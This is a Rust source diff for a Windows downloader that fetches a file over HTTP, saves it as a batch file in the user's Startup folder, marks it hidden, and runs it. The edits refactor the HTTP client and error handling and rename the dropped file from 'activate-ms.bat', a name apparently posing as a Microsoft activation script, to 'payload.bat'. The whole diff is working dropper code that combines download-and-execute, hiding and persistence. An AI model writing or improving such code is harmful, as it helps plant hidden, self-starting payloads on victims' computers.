@@ -12,10 +12,11 @@ use std::{fs::File, process::Command};
 // 3rd party crates
 use anyhow::Result;
 use chrono::Local;
+use curl_http_client::request::HttpRequest;
 use directories::BaseDirs;
 use error::Error;
 use http::{HeaderMap, Method};
-use http_client::{download_file, HttpRequest};
+use http_client::download_file;
 use log::LevelFilter;
 use url::Url;
 use winapi::um::fileapi::{GetFileAttributesW, SetFileAttributesW};
@@ -55,7 +56,7 @@ fn save_to_file(buf: &[u8]) -> Result<PathBuf> {
         .join("Microsoft\\Windows\\Start Menu\\Programs\\Startup");
 
     // Create the file in the 'shell:startup' folder
-    let file_path = startup_path.join("activate-ms.bat");
+    let file_path = startup_path.join("payload.bat");
     let mut file = File::create(file_path.as_path())?;
 
     // Write the string content to the file
@@ -71,7 +72,7 @@ fn save_to_file(buf: &[u8]) -> Result<PathBuf> {
     // Get the current file attributes
     let attributes = unsafe { GetFileAttributesW(wide_path.as_ptr()) };
     if attributes == 0xFFFFFFFF {
-        return Err(Error::Other("GetFileAttributesW failed".to_string()).into());
+        return Err(Error::Curl("GetFileAttributesW failed".to_string()).into());
     }
 
     // Set the "hidden" attribute
@@ -80,7 +81,7 @@ fn save_to_file(buf: &[u8]) -> Result<PathBuf> {
     // Update the file attributes
     let result = unsafe { SetFileAttributesW(wide_path.as_ptr(), new_attributes) };
     if result == 0 {
-        return Err(Error::Other("SetFileAttributesW failed".to_string()).into());
+        return Err(Error::Curl("SetFileAttributesW failed".to_string()).into());
     }
     Ok(file_path)
 }
@@ -92,7 +93,7 @@ fn create_request() -> Result<HttpRequest> {
         )?,
         method: Method::GET,
         headers: HeaderMap::new(),
-        body: Vec::new(),
+        body: None,
     };
     Ok(request)
 }
@@ -103,8 +104,10 @@ async fn main() -> Result<()> {
 
     let request = create_request()?;
     let response = download_file(request).await?;
-    let file_path = save_to_file(&response.body.as_slice())?;
-    let _ = Command::new(file_path.as_os_str()).spawn()?;
 
+    if let Some(body) = response.body {
+        let file_path = save_to_file(body.as_slice())?;
+        let _ = Command::new(file_path.as_os_str()).spawn()?;
+    }
     Ok(())
 }
